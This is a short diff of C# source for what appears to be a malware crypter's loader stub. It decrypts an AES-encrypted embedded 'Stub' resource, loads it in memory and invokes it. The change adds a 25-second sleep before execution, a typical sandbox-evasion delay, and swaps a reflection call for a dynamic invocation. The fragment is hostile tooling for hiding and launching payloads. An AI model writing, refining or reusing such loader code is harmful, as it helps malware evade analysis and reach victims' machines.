@@ -6,6 +6,7 @@ using System.Text;
 using System.Resources;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using System.Threading;
 
 [assembly: AssemblyTitle("#AssemblyProduct")]
 [assembly: AssemblyDescription("#AssemblyDescription")]
@@ -40,10 +41,11 @@ namespace Loader
 
         public void Initialize()
         {
+            Thread.Sleep(25 * 1000);
             Assembly myAssembly = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("#Stub")));
             Type myType = myAssembly.GetType("Stub.Program");
-            object myObj = Activator.CreateInstance(myType);
-            myType.InvokeMember("Run", BindingFlags.InvokeMethod, null, myObj, null);
+            dynamic myObj = Activator.CreateInstance(myType);
+            myObj.Run();
         }
 
         private static byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
